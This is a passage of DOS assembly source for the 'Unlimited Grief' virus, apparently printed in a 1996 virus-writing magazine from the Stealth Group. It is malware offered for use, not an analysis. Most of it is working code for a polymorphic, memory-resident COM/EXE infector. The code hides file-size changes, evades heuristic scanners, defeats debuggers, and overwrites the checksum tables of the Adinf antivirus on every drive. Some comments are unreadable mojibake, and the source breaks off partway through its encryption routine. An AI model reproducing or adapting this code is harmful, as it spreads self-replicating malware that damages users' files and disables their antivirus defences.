;
;      ‹‹                  €
;     ﬂﬂﬂ  Virus Magazine  € Box 10, Kiev 148, Ukraine       IV   1996
;     ﬂ€€ ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ € ﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂﬂ ﬂ ﬂﬂﬂﬂﬁﬂﬂﬂ  €ﬂﬂﬂﬂﬂﬂﬂ€
;      ﬁ€ €ﬂ‹ €ﬂﬂ ‹ﬂﬂ ‹ﬂﬂ ‹€‹ ‹ﬂﬂ €ﬂ€    › € ‹ﬂ€ € ‹ﬂﬂ €‹‹   € € €ﬂ€ € 
;       € € € €ﬂ  €ﬂ  €    €  €ﬂ  € €    € € € € € €   €     € € € € €
;       € ﬁ ﬁ ﬁ   ﬁ‹‹ ﬁ‹‹  ﬁ  ﬁ‹‹ ﬁ‹ﬂ     ﬂ€ ﬂ‹€ ﬁ ﬁ‹‹ ﬁ‹‹‹  € € €‹€ €
;       ﬁ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹ ‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹‹  €‹‹‹‹‹‹‹€
;          (C) Copyright, 1994-96, by STEALTH group WorldWide, unLtd.
;
;----------------------------------------------------------------------------
; ç•°Æ´ÏËÆ© ™Æ¨¨•≠‚†‡®©: è•‡•§ ¢†¨® ®·ÂÆ§≠®™ Æ§≠Æ£Æ ®ß ¨Æ®Â ·‚†‡ÎÂ ¢®‡„·Æ¢.
; ë†¨Î¨ °Æ´ÏË®¨ •£Æ ≠•§Æ·‚†‚™Æ¨ Ô¢´ÔÓ‚·Ô Ì´•¨•≠‚Î ™®‚†©·™Æ£Æ Ø‡Æ£‡†¨¨®‡Æ¢†≠®Ô,
; † ®¨•≠≠Æ °´Æ™ §†≠≠ÎÂ ¢ ≠†Á†´• ¢®‡„·† ® ··Î´™® ≠† ·¨•È•≠®Ô. ç®™Æ£§† ‚†™ ≠•
; §•´†©‚•! àß-ß† Ì‚Æ£Æ ¢®‡„· çÖ äéåèàãàêìÖíëü TASM 4.0 ® 5.0. Ç ≠Æ¢Æ© ¢•‡·®®
; ¢·• Ì‚Æ ®·Ø‡†¢´•≠Æ. ä‡Æ¨• ‚Æ£Æ, Ì‚† ¢•‡·®Ô ÆØÆß≠†•‚·Ô DrWeb ™†™ ¨Æ§®‰®™†Ê®Ô
; StGroup.Killer, † ≠Æ¢†Ô ≠• ÆØÆß≠†•‚·Ô ¢Æ¢·• ® §ÆØÆ´≠®‚•´Ï≠Æ ß†‡†¶†•‚ SYS
; ‰†©´Î.
; P.S. à·ØÆ´ÏßÆ¢†≠≠Î© ß§•·Ï ¨•‚Æ§ ÆØ‡•§•´•≠®Ô †§‡•·† int 21h ≠• ‡†°Æ‚†•‚ ØÆ§
; Windows 95.
;----------------------------------------------------------------------------
;                                                    TO WHOM IT MAY CONCERN.
;                                                    ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕ
;                         -= Unlimited Grief =-
;
; ---------------------------------------------------------------------------
; This virus includes the EMME (Eternal Maverick Multilevel Encryptor) v3.0.
; ---------------------------------------------------------------------------
; Polymorphic ( from 1 up to 4 levels of encryption ) resident COM, EXE & OV?
; infector.  Does not decrease memory size and is not detectable by heuristic
; analizers (like WEB,F-PROT & TBAV),  does not destroy overlay EXE, does not
; conflict with CHKDSK  and  residents,  can not be cured with TBCLEAN,  many
; resident virus traps  ( like ANTIAPE.SYS )  are  not  able to intercept its
; attempt  to stay  resident  ( if it is possible uses UMB,  if not waits for
; program termination  and  then  allocates about 2700 bytes in low memory ).
; It uses an original technique to find DOS INT 21h handler. It is a Stealth.
; Uses anti-debugging tricks, disables stealth when archivators are executed.
; It destroys Adinf tables when executed first time.    NONDESTRUCTIVE !
; Assembled with TASM 3.1 (tasm /z/m2 grief.asm), TASM 4.0 fails & sucks.
;
;                                  (c) Eternal Maverick 1996.  Stealth Group.
;     …ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕª
;     ∫        YES,       ∫        Special  thanks  to Populizer  for help
;     ∫   IT WORKS WITH   ∫        in bug-fixing & Dark Angel  for his UMB
;     ∫ MICROSOFT WINDOWS ∫        residency.
;     »ÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕÕº
;                                  Congratulations to all virmakers.
;
; All trade marks are properties of their respective owners.
; ---------------------------------------------------------------------------
;       P.S. Guys, sorry for ill comments! Nevertheless it's interesting!
; ---------------------------------------------------------------------------
        .model tiny
        .code
        org 100h
START:
;-------------------------------------------------------------------
VL       EQU    OFFSET VIREND - START           ; A length of pure virus code
INT24h   EQU    OFFSET ERRORINT - START + 10h   ; Int24h handler offset in
                                                ; memory block
INT_NEW  EQU    OFFSET MAININT - START + 10h    ; Offset of Int21h

; P.S. First 10h bytes of virus memory block are used for data storing

BACKDOOR EQU    OFFSET INSTALL - INSTALLED      ; Used during installation

CALL21h  EQU    OFFSET NO_RET_2 - START + 10h + 1 ; Places for old int21h
CALLDOS  EQU    OFFSET NO_RET_1 - START + 10h     ; & original int21h storing

RES_INST EQU    OFFSET PATTERN - START + 10h
RETURN   EQU    OFFSET FAIL - START + 11h
INT22H   EQU    OFFSET EXIT_INT - START + 10h
BYTES    EQU    VL + 10h
NEWBYTES EQU    BYTES + 1Ch
;-----------------------------------------
;       Another data area
;-----------------------------------------
SAVE_AX  EQU    NEWBYTES+18h
_HIGH_   EQU    SAVE_AX + 2
_LOW_    EQU    _HIGH_ + 2
NO_HIGH  EQU    _LOW_ + 2
NO_LOW   EQU    NO_HIGH + 2
LNEW     EQU    NO_LOW + 2
HNEW     EQU    LNEW + 2
;-----------------------------------------
VIDEO    EQU    0BE00h                  ; Segment of video memory
                                        ; used for encryption
;--------------------------------------------------------------------
        PUSH ES
        CALL DEBUG
INSTALLED:
        ADD  SI,OFFSET VIREND - INSTALLED
        POP  DX
        XOR  AX,AX
        MOV  BX,AX
        MOV  ES,DX
        MOV  DS,DX
        MOV  CX,SS                      ; Check if it is EXE or COM
        CMP  CX,DX                      ; by comparing SS and DS. It
        JNE  _EXE_                      ; OK, because this virus resets
                                        ; stack in EXE files

;----------------------------------------
;       Restoring of COM
;----------------------------------------
        MOV  DI,0100h
        PUSH DI
        MOV  CX,0Ch
        REP  MOVSW
        RET
_EXE_:
;----------------------------------------
;       Restoring of EXE
;----------------------------------------
        ADD  DX,10h
        MOV  CX,DX
        CLI
        ADD  CX,WORD PTR CS:[SI+0Eh]
        MOV  SS,CX
        MOV  SP,WORD PTR CS:[SI+10h]
        STI
        ADD  DX,WORD PTR CS:[SI+16h]
        PUSH DX
        PUSH WORD PTR CS:[SI+14h]
        RETF
INSTALL:
;--------------------------------------
;       Try to climb to UMB
;       Thanks to Dark Angel
;--------------------------------------
        SUB  SI,OFFSET INSTALL-START
        PUSH ES
        PUSH SI

        XOR  DI,DI
        MOV  AX,3306h           ; get true DOS version
        INT  21h
        INC  AL                 ; DOS 4-?
        JZ   NO_UMBs            ; if so, we don't have UMB's

        MOV  AH,52h             ; get DOS master list
        INT  21h

        LDS  SI,ES:[BX+12h]     ; get ptr to disk buffer info

        MOV  AX,DS:[SI+1Fh]     ; get address of the first UMB
        INC  AX                 ; (FFFF if no UMBs present)
        JZ   NO_UMBs
        DEC  AX                 ; undo damage from above

SEARCH_CHAIN:

        MOV  DS,AX              ; go to the MCB
        CMP  WORD PTR [DI+1],DI ; unused?
        JNZ  SEARCH_NEXT
        CMP  WORD PTR [DI+3],(VL/16)+10  ; MCB large enough to
        JA   HANDLE_MCB                  ; hold us and our MCB?

SEARCH_NEXT:
        CMP  BYTE PTR [DI],'Z'  ; end of chain?
        JZ   NO_UMBs
        MOV  BX,[DI+3]          ; go to the next MCB
        INC  AX
        ADD  AX,BX
        JMP  SHORT SEARCH_CHAIN

HANDLE_MCB:
        SUB  WORD PTR [DI+3],(VL/16)+11  ; adjust size of memory
                                        ; area for virus + its MCB
        MOV  BX,[DI+3]                  ; get size of new memory area
        MOV  CL,'M'                     ; make sure this MCB doesn't
        XCHG CL,BYTE PTR [DI]           ; mark the end of the chain
        INC  AX
        ADD  AX,BX                      ; go to virus segment's MCB
        MOV  DS,AX
        MOV  ES,AX

        MOV  BYTE PTR [DI],CL           ; patch end of chain indicator
        MOV  WORD PTR [DI+1],70h        ; mark MCB owned by DOS
        MOV  WORD PTR [DI+3],(VL/16)+10 ; patch in virus size

        INC  AX                         ; ds->virus segment
        MOV  DS,AX

        MOV  DI,8                       ; go to program name field
        MOV  AX,'CS'                    ; make virus invisible to MEM
        STOSW                           ; by pretending it is
        XOR  AX,AX                      ; DOS system code
        STOSW
        STOSW
        STOSW
;--------------------------------------
;       Move my virus up!
;--------------------------------------
        POP  SI
        POP  ES
        PUSH DS
        POP  ES
        CALL REMOVE
        JMP  SHORT TRACE
NO_UMBs:
        POP  SI
        POP  ES
;--------------------------------------
        MOV  BX,WORD PTR ES:[2]
        SUB  BX,(VL/16)+10
        PUSH ES
        MOV  ES,BX
        CALL REMOVE                     ; Move virus up
                                        ; without MCB change
;--------------------------------------
        POP  DS
        MOV  SI,0Ah
        MOV  DI,RETURN
        MOVSW
        MOVSW
        MOV  WORD PTR DS:[SI-2],ES      ; Set Int22h in PSP
        MOV  WORD PTR DS:[SI-4],INT22h  ; to virus int22h handler
TRACE:
;--------------------------------------
;       Save int 21h
;--------------------------------------
        PUSH ES
        mov  ax,3521h
        int  21h
        pop  ds
        push ds
        mov  ds:[call21h+1],bx
        mov  ds:[call21h+3],es
;-----------------------------------------
;     Searching for original int 21h
;-----------------------------------------
; This technique is derived from  DIR_II
; virus. Works with all DOS versions from
; MS DOS 3.0 to PC DOS 7.0
;-----------------------------------------
        MOV  AH,52h
        INT  21h
        MOV  SI,ES:[BX+4]
        LDS  SI,ES:[SI-4]
FIND21:
        DEC  SI
        CMP  WORD PTR DS:[SI],0E18Ah
        JNE  FIND21
        CMP  BYTE PTR DS:[SI+2],0EBh
        JNE  FIND21
FINDYOU:
        LODSB
        CMP  AL,77h
        JNE  FINDYOU
        SUB  SI,4
        MOV  AX,DS
        POP  DS
        MOV  WORD PTR DS:[CALLDOS+1],SI
        MOV  WORD PTR DS:[CALLDOS+3],AX
SET21h:
        MOV  DX,INT_NEW
        MOV  AX,2521h
        INT  21h
        POP  SI
        JMP  SI         ; Installation complete.

;-----------------
; int 22h handler
;-----------------
EXIT_INT:
        MOV  AH,48h
        MOV  BX,(VL/16)+7
        INT  21h        ; Get a memory block
        JC   FAIL
        DEC  AX
        MOV  ES,AX
        XOR  SI,SI
        MOV  WORD PTR ES:[SI+1],070h    ; Make in invisible for many progs
                                        ; Set environment mark 70h
        CALL REMOVE                     ; Move virus in new place
        INC  AX
        MOV  DS,AX
        CALL SET21h                     ; Set Int21h
FAIL:
DB      0EAh,0,0,0,0                    ; Return to DOS

;-----------------
; int 24h handler
;-----------------
ERRORINT:
        MOV  AL,3       ; AL = 3 (abort current proccess)
        IRET
READER:
;------------------------------
; Int 21h function 3Fh handler
; Needed for stealth
;------------------------------
        CALL OURFILE
        CALL INT_21h
        JC   GOGO_1

        PUSHF
        PUSH CX
        PUSH BX
        PUSH SI
        PUSH DI
        PUSH ES
        PUSH DX
        PUSH DS

        PUSH CS
        POP  DS
        MOV  DS:[SAVE_AX],AX

        MOV  AL,01h
        CALL SEEK_X
        JC   GOGO

        MOV  DS:[HNEW],DX
        MOV  DS:[LNEW],AX

        SUB  AX,WORD PTR DS:[SAVE_AX]
        SBB  DX,0

        MOV  DS:[_HIGH_],DX
        MOV  DS:[_LOW_],AX

        CALL SEEK_E

        SUB  AX,0E00h
        SBB  DX,0

        MOV  DS:[NO_HIGH],DX
        MOV  DS:[NO_LOW],AX

        CMP  WORD PTR DS:[_HIGH_],0
        JNE  MID
        CMP  WORD PTR DS:[_LOW_],18h
        JAE  MID
BEG:
        CALL READ_L
        MOV  CX,18h
        SUB  CX,DS:[_LOW_]

        CMP  CX,DS:[SAVE_AX]
        JB   OK
        MOV  CX,DS:[SAVE_AX]
OK:
        ADD  SI,DS:[_LOW_]
        POP  ES
        POP  DI
        PUSH DI
        PUSH ES
        REP  MOVSB

        CALL S_INIT
        JC   GOGO
READ_OK:
        CALL SEEK_Z
GOGO:
        MOV  AX,DS:[SAVE_AX]
NO_AX:
        POP  DS
        POP  DX
        POP  ES
        POP  DI
        POP  SI
        POP  BX
        POP  CX
        POPF
GOGO_1:
        RETF 2
MID:
        CALL S_INIT
        JNC   READ_OK

        CALL SEEK_Z

        MOV  CX,DS:[_HIGH_]
        MOV  DX,DS:[_LOW_]

        CALL RCOMP
        JC   NO_AX

        MOV  AX,DS:[NO_HIGH]
        SUB  AX,DS:[_HIGH_]
        MOV  BL,10h
        MUL  BL
        ADD  AX,DS:[NO_LOW]
        SUB  AX,DS:[_LOW_]
        JMP  SHORT NO_AX

;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
;       int  21h  handler
;€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€€
MAININT:
;---------------------
;    Anti-tracing
;---------------------
        PUSH AX
        PUSH SS
        POP  SS
        PUSHF                   ; This instruction can not be traced.
        POP  AX
        TEST AH,1               ; Tracing of our int 21h handle?
        POP  AX
        JNZ  NO_CLOSE           ; Go away!
;---------------------

        CMP  AX,06CFFh          ; Are you there?
        JNE  MORE

        MOV  AL,04Bh            ; Here I am, boss!
        IRET
MORE:
        CMP  AH,3Ch
        JE   MAKE_IT
        CMP  AH,5Bh
        JNE  MORE_1
MAKE_IT:
        CALL INT_21h
        JC   CR_ERROR
        MOV  WORD PTR CS:[0Eh],AX
CR_ERROR:
        RETF 2
MORE_1:
        CMP  AH,03Eh
        JNE  REGI

        CMP  BX,WORD PTR CS:[0Eh]
        JNE  MORE_3

        CMP  BX,5               ; This not looks like a file!
        JB   NO_CLOSE

        MOV  WORD PTR CS:[06h],BX

        PUSH DS
        PUSH BX
        CALL READ_L
        JNE  MORE_2
        CALL TALE_OUT
MORE_2:
        MOV  AH,3Eh
        POP  BX
        POP  DS
        MOV  WORD PTR CS:[0Eh],0
        JMP  SHORT NO_CLOSE
MORE_3:
        CMP  BX,WORD PTR CS:[04h]
        JNE  _EXIT_
        MOV  WORD PTR CS:[04h],0
NO_CLOSE:
        JMP  SHORT _EXIT_
REGI:
        CMP  AH,04Bh
        JNE  NOT_EXEC

        OR   AL,AL
        JZ   COME
FAG:
        MOV  BYTE PTR CS:[08h],0FFh
COME:
        JMP  CHECK
NOT_EXEC:
        CMP  BYTE PTR CS:[09h],0FFh
        JE   _EXIT_

        CMP  AX,4300h
        JE   COME
        CMP  AH,056h
        JE   COME
        CMP  AH,03Dh
        JE   COME

        CMP  AX,4202h
        JNE  NOT_LSEEK

        CALL OURFILE

        PUSH BX
        PUSH CX
        PUSH DX
        CALL SEEK_X

        SUB  AX,0E00h
        SBB  DX,0

        XCHG CX,AX
        XCHG CX,DX
        POP  AX
        ADD  DX,AX
        POP  AX
        ADC  CX,AX
        MOV  AX,4200h
        POP  BX
_EXIT_:
        JMP  SHORT GATE

NOT_LSEEK:
        CMP  AH,03Fh
        JNE  AHEAD
        JMP  READER
AHEAD:
        CMP  AH,4Eh
        JE   HIDE_1
        CMP  AH,4Fh
        JE   HIDE_1
        CMP  AH,11h
        JE   HIDE_2
        CMP  AH,12h
        JE   HIDE_2
        CMP  AH,40h
        JNE  GATE
WRITER:
        CALL OURFILE

        PUSH AX
        PUSH BX
        PUSH SI
        PUSH DS
        PUSH DX
        PUSH CX

        MOV  AL,01h
        CALL SEEK_X
        PUSH AX
        PUSH DX

        CALL READ_L
        JNE  NOT_OUR
        CALL WRITE_L
NOT_OUR:
        POP  CX
        POP  DX
        XOR  AL,AL
        CALL SEEK_Z

        POP  CX
        POP  DX
        POP  DS
        POP  SI
        POP  BX
        POP  AX
GATE:
        JMP  NO_RET_2
HIDE_1:
;-------------------------------------
; Subtracting of VIRUS length
; while 4Eh,4Fh,11h,12h functions
; are called.
;-------------------------------------
        PUSH DI
        CALL PREFIX
        JC   ERROR
        CMP  BYTE PTR ES:[BX+16h],0Fh
        JNE  ERROR
        MOV  DI,1Ah
        JMP  SHORT SUBLEN
HIDE_2:
        PUSH DI
        CALL PREFIX
        POP  AX
        TEST AL,0FFh
        PUSH AX
        JNZ  ERROR
        CMP  BYTE PTR ES:[BX],0FFh      ; Extended FCB - ?
        JNE  SIMPLE
        ADD  BX,7
SIMPLE:
        CMP  BYTE PTR ES:[BX+17h],0Fh
        JNE  ERROR
        MOV  DI,1Dh
SUBLEN:
        SUB  WORD PTR ES:[BX+DI],0E00h
        SBB  WORD PTR ES:[BX+DI+2],0
        JNC  ERROR
        ADD  WORD PTR ES:[BX+DI],0E00h
        ADC  WORD PTR ES:[BX+DI+2],0
ERROR:
        POP  AX
        POPF
        POP  ES
        POP  DI
        RETF 2
CHECK:
;---------------------------------------
;       Check if it is a proper file
;       for infection
;---------------------------------------
        PUSH BP
        PUSH SI
        PUSH DI
        PUSH ES
        PUSH BX
        PUSH CX
        PUSH AX
        PUSH DX
        PUSH DS

        MOV  DI,DX
        MOV  SI,DX
        PUSH DS
        POP  ES
        MOV  AX,1211h
        INT  2Fh                ; Converts ASCIIZ line into UpCase letters
        PUSH CS
        POP  DS
        MOV  BYTE PTR DS:[09h],0
        CLD
        MOV  CX,4
        SUB  DI,CX
        MOV  SI,OFFSET EXTEN - START + 10h
        CALL STR1       ; Check file extention.
        JZ   _ESC
EXITEXT:
        SUB  DI,12      ; Max Length of file name + '.' + extention
        CMP  CL,4
        JE   CHKCOM
        CMP  CL,3
        JNE  TEST_OK
CHKEXE:
        CMP  BYTE PTR ES:[DI+7],'F'             ; Adin'F' - ?
        JE   _ARC                               ; Turn stealth off.
        MOV  SI,OFFSET ANTIV - START + 10h
        CALL CHKNAME
        JNZ  _ESC

        MOV  SI,OFFSET ARCHV - START + 10h
        CALL CHKNAME                            ; Check if it is archivator
                                                ; or not
        JNZ  _ARC

        JMP  SHORT CHKALL
CHKCOM:
        MOV  SI,OFFSET DONOT - START + 10h      ; Checking for COMMAND.COM
                                                ; & WIN.COM
        MOV  AL,2
        CALL CHK1
        JNZ  _ESC
CHKALL:
        MOV  SI,OFFSET ALL - START + 10h     ; Check for CHKDSK. This shit
                                             ; is sometimes COM and sometimes
                                             ; EXE file
        MOV  AL,1
        CALL CHK1
        JZ   TEST_OK
_ARC:
        OR   BYTE PTR DS:[09h],0FFh             ; Disable stealth
_ESC:
        JMP  ABORT                              ; No other actions.
TEST_OK:
        MOV  AX,352Ah
        CALL INT_21h
        MOV  BYTE PTR ES:[BX],0CFh      ; Specialy for AVPTSR & Co
                                        ; Turn Int 2Ah off
;---------------------------------------
;       Save & set INT 24h
;---------------------------------------
        MOV  AX,3524h
        CALL INT_21h

        MOV  WORD PTR DS:[0],BX
        MOV  WORD PTR DS:[2],ES

        MOV  AX,2524h
        MOV  DX,INT24h
        CALL INT_21h

;---------------------------------------
; Disable IRQ-1 (Int 09h)
; It's better than to deal
; with function 33h of INT 21h
;---------------------------------------
; Recommended for nervous users!!! ;-)
;---------------------------------------

        IN   AL,21h
        OR   AL,00000010b
        OUT  21h,AL
;----------------------------------------
        POP  DS
        POP  DX
        PUSH DX
        PUSH DS
        MOV  AX,4300h
        CALL INT_21h

        PUSH CX

        TEST CL,00000100b       ; System file - ?
        JNZ  PROTECT            ; Don't touch it!!!

;----------------------------------------
;       Checking for protected floppy
;       using 3F5h port
;----------------------------------------
        PUSH DX
        MOV  CX,400h
        MOV  DX,3F5h
        MOV  AL,4
        OUT  DX,AL
WAIT_1:
        LOOP WAIT_1

        MOV  CX,400h
        OUT  DX,AL
WAIT_2:
        LOOP WAIT_2

        IN   AL,DX
        TEST AL,40h             ; Protected disk - ?
        POP  DX
        JNZ  PROTECT
;----------------------------------
        POP  CX
        PUSH CX
        AND  CL,0FEh            ; Set READ-ONLY off
        MOV  AX,4301H
        CALL INT_21h
        JNC  _FILE_OK
;-----------------------------------
; I am not able to change attribute
;-----------------------------------
PROTECT:
        POP  CX
        JMP  ESC_2
_FILE_OK:
        PUSH DX
        PUSH DS
        MOV  AX,3D02h
        CALL INT_21h            ; DOS Services  ah=function 3Dh
                                ; open file, al=mode,name@ds:dx
        MOV  WORD PTR CS:[06h],AX
        MOV  AX,5700h
        CALL FILE_X             ; DOS Services  ah=function 57h
                                ; get/set file date & time
        PUSH DX
        PUSH CX

        CMP  BYTE PTR CS:[08h],0FFh
        JNE  TEST_2

        CMP  CL,0Fh             ; Infected file?
        JNE  ESC_0
TAKE_IT:                        ; To cure a file
        CALL READ_L
        JNE  ESC_0
        CALL WRITE_L

        POP  CX
        AND  CL,11100000b
        PUSH CX
ESC_0:
        JMP  ESC_1
TEST_2:
        CMP  CL,0Fh             ; Is it already infected?
        JE   ESC_0

        PUSH CS
        POP  DS
        MOV  DX,BYTES
        CALL READ_H             ; DOS Services  ah=function 3Fh
                                ; read file, cx=bytes, to ds:dx
        CALL SEEK_E

        CMP  AX,0E00h           ; File too small to be infected - ?
        JBE  ESC_0

        MOV  SI,BYTES
        CMP  WORD PTR DS:[SI],5A4Dh     ; 'MZ'
        JE   EXE_FILE
        CMP  WORD PTR DS:[SI],4D5Ah     ; 'ZM'
        JE   EXE_FILE

        CMP  AX,0F000h          ; File too big to be infected - ?
        JAE  ESC_0

        ADD  AX,100h
        MOV  WORD PTR DS:[NEWBYTES+14h],AX      ; IMPORTANT. This is used
                                                ; for encrypting.

        PUSH AX
        CALL MODUL

;-------------------------------------------
;       To create a polymorphic "jump"
;-------------------------------------------
        PUSH DS
        POP  ES
        MOV  DI,NEWBYTES
        MOV  BP,10h     ; Don't change SP in encryptor
        CALL MAKE

        IN   AL,40h
        AND  AL,00000011b
        MOV  AH,AL

        ADD  AX,0E0B8h
        STOSB
        POP  WORD PTR DS:[DI]
        INC  DI
        INC  DI
        MOV  AL,0FFh
        STOSW

        NEG  DX
        ADD  DX,13h
        CALL POLY
;-------------------------------------------
        JMP  SHORT WRITE
EXE_FILE:
;---------------------------------------
;       Is it segmented or not ?
;---------------------------------------
        PUSH DX
        PUSH AX
        MOV  SI,200h
        DIV  SI
        DEC  AX
        CMP  AX,WORD PTR DS:[BYTES+04h]
        POP  AX
        POP  DX
        JA   ESC_1
;-------------------------------------------
        MOV  SI,BYTES
        MOV  DI,NEWBYTES

        PUSH DS
        POP  ES
        MOV  CX,0Ch
        REP  MOVSW
        MOV  CX,10h
        DIV  CX

        SUB  AX,WORD PTR DS:[SI+08h+4]
        MOV  WORD PTR DS:[SI+16h+4],AX  ; ReloCS
        MOV  WORD PTR DS:[SI+14h+4],DX  ; ExeIP
;-----------------------------------------------
;       Reseting STACK
;-----------------------------------------------
        ADD  AX,0E0h
        MOV  WORD PTR DS:[SI+0Eh+4],AX  ; ReloSS
        ADD  DX,200h
        AND  DL,NOT 1                   ; To avoid an odd stack
        MOV  WORD PTR DS:[SI+10h+4],DX  ; ReloSP
;-----------------------------------------------
        ADD  WORD PTR DS:[SI+04h+4],07h ; FileSize

        CALL MODUL                      ; Creats an encrypted modul
                                        ; & writes it to a file
WRITE:
        MOV  DX,NEWBYTES
        CALL WRITE_H                    ; Write first 18h bytes
MARKER:
        POP  CX
        MOV  CL,0Fh                     ; Set time to mark infection
        PUSH CX
ESC_1:
        POP  CX
        POP  DX
        MOV  AX,5701h
        CALL FILE_X             ; DOS Services  ah=function 57h
                                ; get/set file date & time
        MOV  AH,3Eh
        CALL FILE_X             ; DOS Services  ah=function 3Eh
                                ; close file, bx=file handle
        POP  DS
        POP  DX
        POP  CX
        MOV  AX,4301h
        CALL INT_21h            ; DOS Services  ah=function 43h
                                ; get/set file attrb, nam@ds:dx
ESC_2:
;-----------------------------
;       Restore int 24h
;-----------------------------
        LDS  DX,DWORD PTR CS:[0]
        MOV  AX,2524h
        CALL INT_21h
;-----------------------------
;       Enable IRQ-1
;-----------------------------
        IN   AL,21h
        AND  AL,NOT 2
        OUT  21h,AL
;-----------------------------
        POP  DS
        POP  DX
        POP  AX

        MOV  BYTE PTR CS:[08h],0

        CMP  AH,03Dh
;-----------------------------
;       Check for file open
;       Needed for stealth
;-----------------------------
        JNE  GO_AHEAD

        CALL INT_21h
        JC   GO_Fail_1

        MOV  WORD PTR CS:[06h],AX
        PUSH DX
        PUSH DS
        PUSH AX
        CALL READ_L
        JNE  GO_Fail

        POP  AX
        MOV  WORD PTR CS:[04h],AX
        PUSH AX
GO_Fail:
        CALL SEEK_H
        POP  AX
        POP  DS
        POP  DX
GO_Fail_1:
        POP  CX
        POP  BX
        POP  ES
        POP  DI
        POP  SI
        POP  BP
        RETF 2
ABORT:
        POP  DS
        POP  DX
        POP  AX
GO_AHEAD:
        POP  CX
        POP  BX
        POP  ES
        POP  DI
        POP  SI
        POP  BP
        JMP  SHORT NO_RET_2
READ_H:
        MOV  CX,18h
READ_X:
        MOV  AH,3Fh
        JMP  SHORT FILE_X
WRITE_H:
        MOV  CX,18h
WRITE_X:
        MOV  AH,40h
        JMP  SHORT FILE_X
SEEK_H:
        XOR  AL,AL
        JMP  SHORT SEEK_X
SEEK_E:
        MOV  AL,02
SEEK_X:
        XOR  DX,DX
SEEK_Y:
        XOR  CX,CX
SEEK_Z:
        MOV  AH,42h
FILE_X:
        MOV  BX,WORD PTR CS:[06h]

INT_21h PROC NEAR
        PUSHF
        PUSH CS
        CALL NO_RET_1
        RET
NO_RET_1:
        DB   0EAh,00h,00h,00h,00h       ; DOS int 21h

OURFILE PROC NEAR
        CMP  BX,WORD PTR CS:[04h]
        JNE  AWAY
        MOV  WORD PTR CS:[06h],BX
        RET
AWAY:
        ADD  SP,2
OURFILE ENDP

NO_RET_2:
        CLI
        DB   0EAh,00h,00h,00h,00h       ; OLD int 21h
INT_21h ENDP

PREFIX  PROC NEAR
        POP  DI
        PUSH ES
        CALL INT_21h
        PUSHF
        PUSH AX
        MOV  AH,2Fh
        CALL INT_21h
        JMP  DI
PREFIX  ENDP

DEBUG   PROC NEAR
;--------------------------------------------
;   ANTI-DEBUG TRICK (an old & stupid one)
;--------------------------------------------
        IN   AL,21H
        PUSH AX
        MOV  AL,0FFh    ; Disable all IRQ
        OUT  21H,AL
        POP  AX
        OUT  21H,AL
;---------------------------------------------
;   ANTI-DISASSEMBLER TRICK
;---------------------------------------------
        MOV  CX,09EBh
        MOV  AX,02D2Dh
        JMP  $-2
        ADD  AX,02AFFh
        JMP  $-10
        INT  21h
;----------------------------------------------
        POP  SI
        SUB  AL,04Bh    ; Am I here?
        JNZ  TABLES     ; Cirtainly, I am.
        JMP  SI         ; No installation necessary
TABLES:
;------------------------------------
;       Adinf tables to kill!
;------------------------------------
; P.S.  Adinf - a nasty bitch, which
;       creates checksum tables on
;       every hard disk drive.
;------------------------------------
;       To correct a return adress
;------------------------------------
        PUSH SI
        ADD  SI,BACKDOOR
        PUSH SI
;------------------------------------
        call DelTab
mask1   db      'c:\*.*',0
DelTab:
        pop  dx
        push cs
        pop  ds
        mov  di,dx
        mov  byte ptr ds:[di],'c'
NextDisk:
        push ds
        push dx
        mov  cx,07
        mov  ah,4eh
        int  21h
        jc   NotFound
NextKill:
        mov  ah,2fh
        int  21h
        pop  di
        mov  ax,ds:[di]
        push di
        push es
        pop  ds
        mov  dl,byte ptr ds:[bx+1Eh+06]
        or   dl,20h
        cmp  dl,al
        jne  NextFile
        mov  word ptr ds:[bx+1bh],ax
        mov  byte ptr ds:[bx+1dh],'\'
        lea  dx,[bx+1bh]
        xor  cx,cx
        mov  ax,4301h
        int  21h
        mov  cl,07
        mov  ah,3ch
        int  21h
NextFile:
        pop  dx
        pop  ds
        push ds
        push dx
        mov  ah,4fh
        int  21h
        jnc  NextKill
NotFound:
        pop  dx
        pop  ds
        mov  di,dx
        inc  byte ptr ds:[di]
        cmp  al,12h
        je   NextDisk
;-----------------------------
        RET
DEBUG   ENDP

MODUL   PROC NEAR
;---------------------------------
;       The most difficult
;       procedure. No comments!
;---------------------------------
        MOV  DI,VIDEO
        MOV  ES,DI
        MOV  SI,10h
        XOR  DI,DI
        IN   AX,40h

        TEST AL,4
        JZ   NEXT_LEVEL

        PUSH SI
        MOV  SI,OFFSET INTINST - 100h + 10h
        MOV  WORD PTR DS:[SI+1],AX
        MOV  CX,OFFSET GRID-INTINST
        REP  MOVSB
        MOV  CX,(3584-28)/2
        POP  SI
INTERNAL:
        MOVSW
        XOR  WORD PTR ES:[DI-2],AX
        LOOP INTERNAL

        CALL NEW_SEG

NEXT_LEVEL:
        TEST AL,1
        JZ   LAST_LEVEL

        PUSH SI
        PUSH DS
        MOV  SI,OFFSET FICTION - 100h + 10h
        PUSH CS
        POP  DS
        MOV  CX,OFFSET ANTIWEB - FICTION
        REP  MOVSB
        MOV  CX,(3584-28)/4
        POP  DS
        POP  SI
MIX:
        LODSW
        STOSW
        MOVSW
        XOR  WORD PTR ES:[DI-2],AX
        LOOP MIX

        CALL NEW_SEG

LAST_LEVEL:
        TEST AL,2
        JZ   POLY_LEVEL

        PUSH SI
        PUSH DS
        MOV  SI,OFFSET GRID - 100h + 10h
        PUSH CS
        POP  DS
        MOV  WORD PTR DS:[SI+1],AX
        MOV  CX,OFFSET FICTION - GRID
        REP  MOVSB
        MOV  CX,(3584-28)/3
        POP  DS
        POP  SI
PITHOLE:
        MOVSW
        ADD  WORD PTR ES:[DI-2],AX
        MOVSB
        LOOP PITHOLE

        CALL NEW_SEG

;----------------------------------------------------------------
;       Creating of polymorphic level.
;       PARAMETERS:
;       ES - points to buffer of proper size.
